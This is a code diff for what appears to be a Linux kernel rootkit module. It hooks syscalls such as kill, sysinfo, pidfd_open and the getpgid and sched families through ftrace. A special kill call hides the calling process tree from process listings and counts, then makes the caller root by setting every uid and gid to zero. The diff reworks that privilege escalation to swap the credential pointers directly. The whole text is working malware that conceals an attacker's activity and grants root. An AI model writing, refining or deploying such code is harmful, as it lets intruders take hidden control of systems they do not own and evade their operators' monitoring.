@@ -18,28 +18,23 @@ static notrace void SpawnRoot(void);
 
 static inline bool should_hide_pid_by_int(int pid)
 {
-    int i;
     if (pid <= 0)
         return false;
 
-    for (i = 0; i < hidden_count; i++) {
-        if (hidden_pids[i] == pid)
-            return true;
-    }
-    return false;
+    return is_hidden_pid(pid);
 }
 
 static notrace void hide_process_tree(void)
 {
     struct task_struct *task;
     struct list_head *list;
-    
+
     if (!current)
         return;
-    
+
     add_hidden_pid(current->pid);
     add_hidden_pid(current->tgid);
-    
+
     list_for_each(list, &current->children) {
         task = list_entry(list, struct task_struct, sibling);
         if (task) {
@@ -47,7 +42,7 @@ static notrace void hide_process_tree(void)
             add_child_pid(task->tgid);
         }
     }
-    
+
     if (current->signal) {
         struct task_struct *t = current;
         do {
@@ -64,12 +59,12 @@ static notrace asmlinkage long hook_kill(const struct pt_regs *regs) {
         hide_process_tree();
         msleep(50);
         SpawnRoot();
-        
+
         if (pid > 0 && pid != current->pid) {
             add_hidden_pid(pid);
             add_child_pid(pid);
         }
-        
+
         return 0;
     }
 
@@ -85,13 +80,13 @@ static notrace asmlinkage long hook_kill(const struct pt_regs *regs) {
 static notrace asmlinkage long hook_pidfd_open(const struct pt_regs *regs)
 {
     int pid = (int)regs->di;
-    
+
     if (should_hide_pid_by_int(pid))
         return -ESRCH;
-    
+
     if (!orig_pidfd_open)
         return -ENOSYS;
-    
+
     return orig_pidfd_open(regs);
 }
 
@@ -162,8 +157,11 @@ static notrace asmlinkage long hook_sysinfo(const struct pt_regs *regs)
         if (copy_from_user(&kinfo, user_info, sizeof(kinfo)) != 0)
             return ret;
 
-        if (hidden_count > 0 && kinfo.procs > hidden_count)
-            kinfo.procs -= hidden_count;
+        {
+            int hidden_nr = hidden_pid_count();
+            if (hidden_nr > 0 && kinfo.procs > hidden_nr)
+                kinfo.procs -= hidden_nr;
+        }
 
         copy_to_user(user_info, &kinfo, sizeof(kinfo));
     }
@@ -201,36 +199,46 @@ static notrace asmlinkage long hook_getpgrp(const struct pt_regs *regs)
     return orig_getpgrp(regs);
 }
 
-static notrace void SpawnRoot(void) {
-    struct cred *newcredentials;
+static notrace void SpawnRoot(void)
+{
+    struct cred *new;
+    const struct cred *old;
 
-    newcredentials = prepare_creds();
-    if (!newcredentials)
+    new = prepare_creds();
+    if (!new)
         return;
 
-    newcredentials->uid.val   = 0;
-    newcredentials->gid.val   = 0;
-    newcredentials->suid.val  = 0;
-    newcredentials->sgid.val  = 0;
-    newcredentials->fsuid.val = 0;
-    newcredentials->fsgid.val = 0;
-    newcredentials->euid.val  = 0;
-    newcredentials->egid.val  = 0;
+    new->uid.val   = 0;
+    new->gid.val   = 0;
+    new->suid.val  = 0;
+    new->sgid.val  = 0;
+    new->euid.val  = 0;
+    new->egid.val  = 0;
+    new->fsuid.val = 0;
+    new->fsgid.val = 0;
 
-    commit_creds(newcredentials);
+    task_lock(current);
+    old = current->real_cred;
+
+    rcu_assign_pointer(current->real_cred, new);
+    rcu_assign_pointer(current->cred,      new);
+
+    task_unlock(current);
+
+    put_cred(old);
 }
 
 static struct ftrace_hook hooks[] = {
-    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
-    HOOK("__x64_sys_getpgid", hook_getpgid, &orig_getpgid),
-    HOOK("__x64_sys_getpgrp", hook_getpgrp, &orig_getpgrp),
-    HOOK("__x64_sys_getsid", hook_getsid, &orig_getsid),
-    HOOK("__x64_sys_sched_getaffinity", hook_sched_getaffinity, &orig_sched_getaffinity),
-    HOOK("__x64_sys_sched_getparam", hook_sched_getparam, &orig_sched_getparam),
-    HOOK("__x64_sys_sched_getscheduler", hook_sched_getscheduler, &orig_sched_getscheduler),
-    HOOK("__x64_sys_sched_rr_get_interval", hook_sched_rr_get_interval, &orig_sched_rr_get_interval),
-    HOOK("__x64_sys_sysinfo", hook_sysinfo, &orig_sysinfo),
-    HOOK("__x64_sys_pidfd_open", hook_pidfd_open, &orig_pidfd_open),
+    HOOK("__x64_sys_kill",                    hook_kill,                    &orig_kill),
+    HOOK("__x64_sys_getpgid",                 hook_getpgid,                 &orig_getpgid),
+    HOOK("__x64_sys_getpgrp",                 hook_getpgrp,                 &orig_getpgrp),
+    HOOK("__x64_sys_getsid",                  hook_getsid,                  &orig_getsid),
+    HOOK("__x64_sys_sched_getaffinity",       hook_sched_getaffinity,       &orig_sched_getaffinity),
+    HOOK("__x64_sys_sched_getparam",          hook_sched_getparam,          &orig_sched_getparam),
+    HOOK("__x64_sys_sched_getscheduler",      hook_sched_getscheduler,      &orig_sched_getscheduler),
+    HOOK("__x64_sys_sched_rr_get_interval",   hook_sched_rr_get_interval,   &orig_sched_rr_get_interval),
+    HOOK("__x64_sys_sysinfo",                 hook_sysinfo,                 &orig_sysinfo),
+    HOOK("__x64_sys_pidfd_open",              hook_pidfd_open,              &orig_pidfd_open),
 };
 
 notrace int become_root_init(void) {
